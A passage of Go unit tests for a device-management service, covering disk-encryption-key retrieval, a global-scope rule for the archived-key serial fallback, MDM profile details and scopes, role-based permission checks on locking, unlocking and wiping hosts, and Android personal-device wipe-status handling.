		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
			return &automdm.HostDiskEncryptionKey{
				Base64Encrypted: "invalidEncryptedKey",
				Decryptable:     new(true),
			}, nil
		}
		ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
			return &automdm.HostArchivedDiskEncryptionKey{
				Base64Encrypted: "invalidArchivedKey",
			}, nil
		}
		ds.GetAllMDMConfigAssetsByNameFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName,
			_ sqlx.QueryerContext,
		) (map[automdm.MDMAssetName]automdm.MDMConfigAsset, error) {
			return map[automdm.MDMAssetName]automdm.MDMConfigAsset{
				automdm.MDMAssetCACert: {Name: automdm.MDMAssetCACert, Value: testCertPEM},
				automdm.MDMAssetCAKey:  {Name: automdm.MDMAssetCAKey, Value: testKeyPEM},
			}, nil
		}
		ds.GetAllMDMConfigAssetsByNameIncludingDeletedFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName) ([]automdm.MDMConfigAsset, error) {
			return []automdm.MDMConfigAsset{{Name: automdm.MDMAssetCACert, Value: testCertPEM}}, nil
		}

		_, err := svc.HostEncryptionKey(ctx, 1, false)
		require.Error(t, err)

		var ume *automdm.UserMessageError
		require.True(t, errors.As(err, &ume))
		require.Contains(t, ume.Error(), "Couldn't decrypt the disk encryption key")
	})

	// The archived-key lookup can fall back to matching on hardware_serial, which is
	// agent-reported and not scoped to a team. Only a globally-scoped user may request
	// that fallback; for anyone else it is silently downgraded so the response is
	// indistinguishable from "no archived key", leaving no cross-team probing oracle.
	t.Run("serial fallback requires global scope", func(t *testing.T) {
		teamHost := &automdm.Host{
			ID:             3,
			Platform:       "darwin",
			NodeKey:        new("test_key_3"),
			Hostname:       "test_hostname_3",
			UUID:           "test_uuid_3",
			HardwareSerial: "VICTIM_SERIAL",
			TeamID:         new(uint(1)),
		}

		for _, tc := range []struct {
			name         string
			user         *automdm.User
			wantFallback bool
		}{
			{"global admin", test.UserAdmin, true},
			{"global observer", test.UserObserver, true},
			{"team admin", test.UserTeamAdminTeam1, false},
			{"team observer", test.UserTeamObserverTeam1, false},
		} {
			t.Run(tc.name, func(t *testing.T) {
				ds := new(mock.Store)
				ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
					return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
				}
				opts := &TestServerOpts{}
				svc, ctx := newTestServiceWithConfig(t, ds, automdmCfg, nil, nil, opts)

				ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
					return teamHost, nil
				}
				ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*automdm.HostDiskEncryptionKey, error) {
					return nil, newNotFoundError()
				}
				var gotFallback bool
				ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, fallbackToSerial bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
					gotFallback = fallbackToSerial
					return &automdm.HostArchivedDiskEncryptionKey{Base64Encrypted: base64EncryptedKey}, nil
				}
				opts.ActivityMock.NewActivityFunc = func(_ context.Context, _ *activity_api.User, _ activity_api.ActivityDetails) error {
					return nil
				}
				ds.GetAllMDMConfigAssetsByNameFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName,
					_ sqlx.QueryerContext,
				) (map[automdm.MDMAssetName]automdm.MDMConfigAsset, error) {
					return map[automdm.MDMAssetName]automdm.MDMConfigAsset{
						automdm.MDMAssetCACert: {Name: automdm.MDMAssetCACert, Value: testCertPEM},
						automdm.MDMAssetCAKey:  {Name: automdm.MDMAssetCAKey, Value: testKeyPEM},
					}, nil
				}
				ds.GetAllMDMConfigAssetsByNameIncludingDeletedFunc = func(ctx context.Context, assetNames []automdm.MDMAssetName) ([]automdm.MDMConfigAsset, error) {
					return []automdm.MDMConfigAsset{{Name: automdm.MDMAssetCACert, Value: testCertPEM}}, nil
				}

				// The caller asks for the serial fallback in every case; only global scope grants it.
				_, err := svc.HostEncryptionKey(test.UserContext(ctx, tc.user), teamHost.ID, true)
				require.NoError(t, err)
				require.True(t, ds.GetHostArchivedDiskEncryptionKeyFuncInvoked)
				require.Equal(t, tc.wantFallback, gotFallback)
			})
		}
	})
}

// Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
func TestHostMDMProfileDetail(t *testing.T) {
	ds := new(mock.Store)
	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
		return automdm.DiskEncryptionConfig{}, nil
	}
	testCert, testKey, err := apple_mdm.NewSCEPCACertKey()
	require.NoError(t, err)
	testCertPEM := tokenpki.PEMCertificate(testCert.Raw)
	testKeyPEM := tokenpki.PEMRSAPrivateKey(testKey)

	automdmCfg := config.TestConfig()
	config.SetTestMDMConfig(t, &automdmCfg, testCertPEM, testKeyPEM, "")

	svc, ctx := newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
	ctx = test.UserContext(ctx, test.UserAdmin)

	ds.HostFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		return &automdm.Host{
			ID:       1,
			Platform: "darwin",
		}, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hid uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostMDMMacOSSetupFunc = func(ctx context.Context, hid uint) (*automdm.HostMDMMacOSSetup, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{
			MDM: automdm.MDM{
				EnabledAndConfigured: true,
			},
		}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{}, nil
	}
	ds.UpdateHostIssuesFailingPoliciesFunc = func(ctx context.Context, hostIDs []uint) error {
		return nil
	}
	ds.UpdateHostIssuesFailingPoliciesForSingleHostFunc = func(ctx context.Context, hostID uint) error {
		return nil
	}
	ds.GetHostIssuesLastUpdatedFunc = func(ctx context.Context, hostId uint) (time.Time, error) {
		return time.Time{}, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}
	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
		return nil, nil
	}
	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		return nil, nil
	}
	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
		return nil, nil
	}

	cases := []struct {
		name           string
		storedDetail   string
		expectedDetail string
	}{
		{
			name:           "no detail",
			storedDetail:   "",
			expectedDetail: "",
		},
		{
			name:           "other detail",
			storedDetail:   "other detail",
			expectedDetail: "other detail",
		},
		{
			name:           "failed was verifying",
			storedDetail:   string(automdm.HostMDMProfileDetailFailedWasVerifying),
			expectedDetail: automdm.HostMDMProfileDetailFailedWasVerifying.Message(),
		},
		{
			name:           "failed was verified",
			storedDetail:   string(automdm.HostMDMProfileDetailFailedWasVerified),
			expectedDetail: automdm.HostMDMProfileDetailFailedWasVerified.Message(),
		},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, host_uuid string) ([]automdm.HostMDMAppleProfile, error) {
				return []automdm.HostMDMAppleProfile{
					{
						Name:          "test",
						Identifier:    "test",
						OperationType: automdm.MDMOperationTypeInstall,
						Status:        &automdm.MDMDeliveryFailed,
						Detail:        tt.storedDetail,
					},
				}, nil
			}

			h, err := svc.GetHost(ctx, uint(1), automdm.HostDetailOptions{})
			require.NoError(t, err)
			require.NotNil(t, h.MDM.Profiles)
			profs := *h.MDM.Profiles
			require.Len(t, profs, 1)
			require.Equal(t, tt.expectedDetail, profs[0].Detail)
		})
	}
}

// Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
func TestHostMDMProfileScopes(t *testing.T) {
	ds := new(mock.Store)
	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
		return automdm.DiskEncryptionConfig{}, nil
	}
	testCert, testKey, err := apple_mdm.NewSCEPCACertKey()
	require.NoError(t, err)
	testCertPEM := tokenpki.PEMCertificate(testCert.Raw)
	testKeyPEM := tokenpki.PEMRSAPrivateKey(testKey)

	automdmCfg := config.TestConfig()
	config.SetTestMDMConfig(t, &automdmCfg, testCertPEM, testKeyPEM, "")

	svc, ctx := newTestServiceWithConfig(t, ds, automdmCfg, nil, nil)
	ctx = test.UserContext(ctx, test.UserAdmin)

	appleHost := &automdm.Host{
		ID:       1,
		UUID:     "apple-host-uuid",
		Platform: "darwin",
	}

	windowsHost := &automdm.Host{
		ID:       2,
		UUID:     "windows-host-uuid",
		Platform: "windows",
	}

	ds.HostFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		if id == appleHost.ID {
			return appleHost, nil
		}
		require.Equal(t, id, windowsHost.ID, "Host should only be called with Apple or Windows host IDs")
		return windowsHost, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hid uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostMDMMacOSSetupFunc = func(ctx context.Context, hid uint) (*automdm.HostMDMMacOSSetup, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.UpdateHostIssuesFailingPoliciesForSingleHostFunc = func(ctx context.Context, hostID uint) error {
		return nil
	}
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{
			MDM: automdm.MDM{
				EnabledAndConfigured:        true,
				WindowsEnabledAndConfigured: true,
			},
		}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{}, nil
	}
	ds.UpdateHostIssuesFailingPoliciesFunc = func(ctx context.Context, hostIDs []uint) error {
		return nil
	}
	ds.GetHostIssuesLastUpdatedFunc = func(ctx context.Context, hostId uint) (time.Time, error) {
		return time.Time{}, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}
	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
		return nil, nil
	}
	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		return nil, nil
	}
	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
		return nil, nil
	}

	appleCases := []struct {
		name             string
		storedProfiles   []automdm.HostMDMAppleProfile
		expectedProfiles []automdm.HostMDMProfile
	}{
		{
			name:             "no profiles",
			storedProfiles:   nil,
			expectedProfiles: nil,
		},
		{
			name:             "system scoped profile",
			storedProfiles:   []automdm.HostMDMAppleProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: &automdm.MDMDeliveryVerified, Scope: automdm.PayloadScopeSystem}},
			expectedProfiles: []automdm.HostMDMProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: new(string(automdm.MDMDeliveryVerified)), Scope: new("device"), ManagedLocalAccount: new("")}},
		},
		{
			name:             "User scoped profile with username",
			storedProfiles:   []automdm.HostMDMAppleProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: &automdm.MDMDeliveryVerified, Scope: automdm.PayloadScopeUser, ManagedLocalAccount: "fleetie"}},
			expectedProfiles: []automdm.HostMDMProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: new(string(automdm.MDMDeliveryVerified)), Scope: new("user"), ManagedLocalAccount: new("fleetie")}},
		},
		{
			name:             "User scoped profile without username for some reason",
			storedProfiles:   []automdm.HostMDMAppleProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: &automdm.MDMDeliveryVerified, Scope: automdm.PayloadScopeUser}},
			expectedProfiles: []automdm.HostMDMProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: new(string(automdm.MDMDeliveryVerified)), Scope: new("user"), ManagedLocalAccount: new("")}},
		},
		{
			name:             "system + user scoped profiles",
			storedProfiles:   []automdm.HostMDMAppleProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: &automdm.MDMDeliveryVerified, Scope: automdm.PayloadScopeSystem}, {OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid2", Name: "Profile2", Status: &automdm.MDMDeliveryVerified, Scope: automdm.PayloadScopeUser, ManagedLocalAccount: "fleetie"}},
			expectedProfiles: []automdm.HostMDMProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: new(string(automdm.MDMDeliveryVerified)), Scope: new("device"), ManagedLocalAccount: new("")}, {OperationType: automdm.MDMOperationTypeInstall, HostUUID: appleHost.UUID, ProfileUUID: "profile-uuid2", Name: "Profile2", Status: new(string(automdm.MDMDeliveryVerified)), Scope: new("user"), ManagedLocalAccount: new("fleetie")}},
		},
	}

	windowsCases := []struct {
		name             string
		storedProfiles   []automdm.HostMDMWindowsProfile
		expectedProfiles []automdm.HostMDMProfile
	}{
		{
			name:             "no profiles",
			storedProfiles:   nil,
			expectedProfiles: nil,
		},
		// Windows does not support scopes or managed local accounts yet but we should not error and
		// should set these to nil which is checked below
		{
			name:             "example profile",
			storedProfiles:   []automdm.HostMDMWindowsProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: windowsHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: &automdm.MDMDeliveryVerified}},
			expectedProfiles: []automdm.HostMDMProfile{{OperationType: automdm.MDMOperationTypeInstall, HostUUID: windowsHost.UUID, ProfileUUID: "profile-uuid1", Name: "Profile1", Status: new(string(automdm.MDMDeliveryVerified))}},
		},
	}

	for _, tt := range appleCases {
		t.Run(tt.name, func(t *testing.T) {
			ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, host_uuid string) ([]automdm.HostMDMAppleProfile, error) {
				return tt.storedProfiles, nil
			}

			h, err := svc.GetHost(ctx, appleHost.ID, automdm.HostDetailOptions{})
			require.NoError(t, err)
			if tt.storedProfiles == nil {
				require.NotNil(t, h.MDM.Profiles)
				require.Empty(t, *h.MDM.Profiles)
				return
			}
			profs := *h.MDM.Profiles
			require.Len(t, profs, len(tt.expectedProfiles))
			for i := range profs {
				require.Equal(t, tt.expectedProfiles[i].OperationType, profs[i].OperationType)
				require.Equal(t, tt.expectedProfiles[i].HostUUID, profs[i].HostUUID)
				require.Equal(t, tt.expectedProfiles[i].ProfileUUID, profs[i].ProfileUUID)
				require.Equal(t, tt.expectedProfiles[i].Name, profs[i].Name)
				require.Equal(t, tt.expectedProfiles[i].Status, profs[i].Status)
				require.NotNil(t, profs[i].Scope)
				require.Equal(t, *tt.expectedProfiles[i].Scope, *profs[i].Scope)
				require.NotNil(t, profs[i].ManagedLocalAccount)
				require.Equal(t, *tt.expectedProfiles[i].ManagedLocalAccount, *profs[i].ManagedLocalAccount)
			}
		})
	}
	for _, tt := range windowsCases {
		t.Run(tt.name, func(t *testing.T) {
			ds.GetHostMDMWindowsProfilesFunc = func(ctx context.Context, host_uuid string) ([]automdm.HostMDMWindowsProfile, error) {
				return tt.storedProfiles, nil
			}

			h, err := svc.GetHost(ctx, windowsHost.ID, automdm.HostDetailOptions{})
			require.NoError(t, err)
			if tt.storedProfiles == nil {
				require.NotNil(t, h.MDM.Profiles)
				require.Empty(t, *h.MDM.Profiles)
				return
			}
			profs := *h.MDM.Profiles
			require.Len(t, profs, len(tt.expectedProfiles))
			for i := range profs {
				require.Equal(t, tt.expectedProfiles[i].OperationType, profs[i].OperationType)
				require.Equal(t, tt.expectedProfiles[i].HostUUID, profs[i].HostUUID)
				require.Equal(t, tt.expectedProfiles[i].ProfileUUID, profs[i].ProfileUUID)
				require.Equal(t, tt.expectedProfiles[i].Name, profs[i].Name)
				require.Equal(t, tt.expectedProfiles[i].Status, profs[i].Status)
				require.Nil(t, profs[i].Scope)
				require.Nil(t, profs[i].ManagedLocalAccount)
			}
		})
	}
}

func TestLockUnlockWipeHostAuth(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierPremium}})

	const (
		teamHostID          = 1
		globalHostID        = 2
		teamWindowsHostID   = 3
		globalWindowsHostID = 4
	)

	teamHost := &automdm.Host{TeamID: new(uint(1)), Platform: "darwin"}
	globalHost := &automdm.Host{Platform: "darwin"}
	hostsByID := map[uint]*automdm.Host{
		teamHostID:          teamHost,
		globalHostID:        globalHost,
		teamWindowsHostID:   {TeamID: new(uint(1)), Platform: "windows"},
		globalWindowsHostID: {Platform: "windows"},
	}

	ds.HostByIdentifierFunc = func(ctx context.Context, identifier string) (*automdm.Host, error) {
		if identifier == fmt.Sprint(teamHostID) {
			return teamHost, nil
		}

		return globalHost, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, id uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, hostUUID string) ([]automdm.HostMDMAppleProfile, error) {
		return nil, nil
	}
	ds.GetHostMDMWindowsProfilesFunc = func(ctx context.Context, hostUUID string) ([]automdm.HostMDMWindowsProfile, error) {
		return nil, nil
	}
	ds.GetHostMDMMacOSSetupFunc = func(ctx context.Context, hostID uint) (*automdm.HostMDMMacOSSetup, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.LockHostViaScriptFunc = func(ctx context.Context, request *automdm.HostScriptRequestPayload, platform string) error {
		return nil
	}
	// Some functions use Host, others HostLite. For our purposes either is fine
	ds.HostFunc = func(ctx context.Context, hostID uint) (*automdm.Host, error) {
		return hostsByID[hostID], nil
	}
	ds.HostLiteFunc = mock.HostLiteFunc(ds.HostFunc)
	ds.GetMDMWindowsBitLockerStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostMDMDiskEncryption, error) {
		return nil, nil
	}
	ds.GetHostMDMFunc = func(ctx context.Context, hostID uint) (*automdm.HostMDM, error) {
		return &automdm.HostMDM{Enrolled: true, Name: automdm.WellKnownMDMAutoMDM}, nil
	}
	ds.UnlockHostManuallyFunc = func(ctx context.Context, hostID uint, platform string, ts time.Time) error {
		return nil
	}
	ds.IsHostConnectedToAutoMDMMDMFunc = func(ctx context.Context, host *automdm.Host) (bool, error) {
		return true, nil
	}
	ds.WipeHostViaWindowsMDMFunc = func(ctx context.Context, host *automdm.Host, cmd *automdm.MDMWindowsCommand) error {
		return nil
	}
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{}, nil
	}

	cases := []struct {
		name          string
		user          *automdm.User
		wantGlobalErr error
		wantTeamErr   error
	}{
		{
			name:          "global observer",
			user:          &automdm.User{GlobalRole: new(automdm.RoleObserver)},
			wantGlobalErr: test.ErrForbidden,
			wantTeamErr:   test.ErrForbidden,
		},
		{
			name:          "team observer",
			user:          &automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 1}, Role: automdm.RoleObserver}}},
			wantGlobalErr: test.ErrNotFound,
			wantTeamErr:   test.ErrForbidden,
		},
		{
			name:          "global observer plus",
			user:          &automdm.User{GlobalRole: new(automdm.RoleObserverPlus)},
			wantGlobalErr: test.ErrForbidden,
			wantTeamErr:   test.ErrForbidden,
		},
		{
			name:          "team observer plus",
			user:          &automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 1}, Role: automdm.RoleObserverPlus}}},
			wantGlobalErr: test.ErrNotFound,
			wantTeamErr:   test.ErrForbidden,
		},
		{
			name:          "global admin",
			user:          &automdm.User{GlobalRole: new(automdm.RoleAdmin)},
			wantGlobalErr: nil,
			wantTeamErr:   nil,
		},
		{
			name:          "team admin",
			user:          &automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 1}, Role: automdm.RoleAdmin}}},
			wantGlobalErr: test.ErrNotFound,
			wantTeamErr:   nil,
		},
		{
			name:          "global maintainer",
			user:          &automdm.User{GlobalRole: new(automdm.RoleMaintainer)},
			wantGlobalErr: nil,
			wantTeamErr:   nil,
		},
		{
			name:          "team maintainer",
			user:          &automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 1}, Role: automdm.RoleMaintainer}}},
			wantGlobalErr: test.ErrNotFound,
			wantTeamErr:   nil,
		},
		{
			name:          "team admin wrong team",
			user:          &automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 42}, Role: automdm.RoleAdmin}}},
			wantGlobalErr: test.ErrNotFound,
			wantTeamErr:   test.ErrNotFound,
		},
		{
			name:          "team maintainer wrong team",
			user:          &automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 42}, Role: automdm.RoleMaintainer}}},
			wantGlobalErr: test.ErrNotFound,
			wantTeamErr:   test.ErrNotFound,
		},
		{
			name:          "global gitops",
			user:          &automdm.User{GlobalRole: new(automdm.RoleGitOps)},
			wantGlobalErr: test.ErrForbidden,
			wantTeamErr:   test.ErrForbidden,
		},
		{
			name:          "team gitops",
			user:          &automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 1}, Role: automdm.RoleGitOps}}},
			wantGlobalErr: test.ErrForbidden,
			wantTeamErr:   test.ErrForbidden,
		},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
				return &automdm.AppConfig{
					MDM: automdm.MDM{EnabledAndConfigured: true, WindowsEnabledAndConfigured: true},
				}, nil
			}
			ctx := viewer.NewContext(ctx, viewer.Viewer{User: tt.user})

			_, err := svc.LockHost(ctx, globalHostID, false)
			test.RequireErrKind(t, tt.wantGlobalErr, err)
			_, err = svc.LockHost(ctx, teamHostID, false)
			test.RequireErrKind(t, tt.wantTeamErr, err)

			// Pretend we locked the host
			ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
				return &automdm.HostLockWipeStatus{HostAutoMDMPlatform: host.AutoMDMPlatform(), LockMDMCommand: &automdm.MDMCommand{}, LockMDMCommandResult: &automdm.MDMCommandResult{Status: automdm.MDMAppleStatusAcknowledged}}, nil
			}

			_, err = svc.UnlockHost(ctx, globalHostID)
			test.RequireErrKind(t, tt.wantGlobalErr, err)
			_, err = svc.UnlockHost(ctx, teamHostID)
			test.RequireErrKind(t, tt.wantTeamErr, err)

			// Reset so we're now pretending host is unlocked
			ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
				return &automdm.HostLockWipeStatus{}, nil
			}

			err = svc.WipeHost(ctx, globalHostID)
			test.RequireErrKind(t, tt.wantGlobalErr, err)
			err = svc.WipeHost(ctx, teamHostID)
			test.RequireErrKind(t, tt.wantTeamErr, err)

			err = svc.ResetHost(ctx, globalWindowsHostID)
			test.RequireErrKind(t, tt.wantGlobalErr, err)
			err = svc.ResetHost(ctx, teamWindowsHostID)
			test.RequireErrKind(t, tt.wantTeamErr, err)
		})
	}
}

// TestSuppressAndroidBYODWipeStatus verifies that the transient wipe status is reported as a pending unenroll only for
// the unenroll-driven work-profile wipe on Android BYOD (personal) hosts.
func TestSuppressAndroidBYODWipeStatus(t *testing.T) {
	newHost := func(platform string, enrollment *string, deviceStatus automdm.DeviceStatus, pending automdm.PendingDeviceAction) *automdm.Host {
		return &automdm.Host{
			Platform: platform,
			MDM: automdm.MDMHostData{
				EnrollmentStatus: enrollment,
				DeviceStatus:     new(string(deviceStatus)),
				PendingAction:    new(string(pending)),
			},
		}
	}

	cases := []struct {
		name         string
		platform     string
		enrollment   *string
		deviceStatus automdm.DeviceStatus
		pending      automdm.PendingDeviceAction
		wantSuppress bool
	}{
		{name: "android BYOD pending wipe", platform: "android", enrollment: new(automdm.MDMEnrollmentStatusPersonal), deviceStatus: automdm.DeviceStatusWiped, pending: automdm.PendingActionWipe, wantSuppress: true},
		{name: "android BYOD pending lock", platform: "android", enrollment: new(automdm.MDMEnrollmentStatusPersonal), deviceStatus: automdm.DeviceStatusUnlocked, pending: automdm.PendingActionLock, wantSuppress: false},
		{name: "android BYOD pending clear_passcode", platform: "android", enrollment: new(automdm.MDMEnrollmentStatusPersonal), deviceStatus: automdm.DeviceStatusUnlocked, pending: automdm.PendingActionClearPasscode, wantSuppress: false},
		{name: "android COBO pending wipe", platform: "android", enrollment: new("On (automatic)"), deviceStatus: automdm.DeviceStatusWiped, pending: automdm.PendingActionWipe, wantSuppress: false},
		{name: "non-android pending wipe", platform: "darwin", enrollment: new("On (manual - personal)"), deviceStatus: automdm.DeviceStatusWiped, pending: automdm.PendingActionWipe, wantSuppress: false},
		{name: "android nil enrollment pending wipe", platform: "android", enrollment: nil, deviceStatus: automdm.DeviceStatusWiped, pending: automdm.PendingActionWipe, wantSuppress: false},
	}
	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			host := newHost(tt.platform, tt.enrollment, tt.deviceStatus, tt.pending)
			suppressAndroidBYODWipeStatus(host)
			if tt.wantSuppress {
				require.Equal(t, string(automdm.DeviceStatusUnlocked), *host.MDM.DeviceStatus)
				require.Equal(t, string(automdm.PendingActionUnenroll), *host.MDM.PendingAction)
			} else {
				require.Equal(t, string(tt.deviceStatus), *host.MDM.DeviceStatus)
				require.Equal(t, string(tt.pending), *host.MDM.PendingAction)
			}
